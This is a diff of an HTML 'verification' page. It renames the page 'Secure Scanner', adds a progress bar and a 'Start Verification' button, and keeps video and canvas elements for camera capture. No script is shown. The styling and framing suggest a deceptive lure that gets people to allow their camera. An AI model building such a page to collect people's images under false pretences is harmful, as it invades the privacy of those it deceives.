@@ -2,8 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera Verification</title>
+  <title>Secure Scanner</title>
 
   <style>
     body {
@@ -25,7 +24,21 @@
       background: #22c55e;
       color: white;
       cursor: pointer;
-      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    .progress {
+      width: 300px;
+      height: 18px;
+      background: #1e293b;
+      border-radius: 20px;
+      overflow: hidden;
+    }
+
+    .bar {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg,#22c55e,#06b6d4);
     }
 
     video, canvas {
@@ -36,8 +49,11 @@
 
 <body>
 
-<h2> Verification Required</h2>
-<button onclick="startCamera()">Start Verification</button>
+<button onclick="start()">Start Verification</button>
+
+<div class="progress">
+  <div class="bar" id="bar"></div>
+</div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
